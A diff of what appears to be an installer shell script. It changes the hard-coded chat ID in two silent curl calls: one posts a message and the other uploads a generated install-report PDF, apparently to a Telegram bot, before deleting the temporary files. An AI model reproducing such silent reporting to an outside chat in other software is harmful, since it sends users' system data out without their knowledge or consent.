@@ -724,7 +724,7 @@ curl -s --max-time 10 \
      "$URL_MSG" &>/dev/null
 
 curl -s --max-time 10 \
-     -d "chat_id=1111342634&disable_web_page_preview=1&text=$MSG" \
+     -d "chat_id=-1002826624584&disable_web_page_preview=1&text=$MSG" \
      "$URL_MSG" &>/dev/null
 
 sleep 2
@@ -805,7 +805,7 @@ enscript -B -o - /tmp/report.txt 2>/dev/null \
 # Envía el PDF y limpia archivos temporales
 curl -s \
      -F document=@/tmp/Install_Report.pdf \
-     -F chat_id="1111342634" \
+     -F chat_id="-1002826624584" \
      "$URL_DOC" >/dev/null 2>&1
 
 rm -f /tmp/report.txt /tmp/Install_Report.pdf
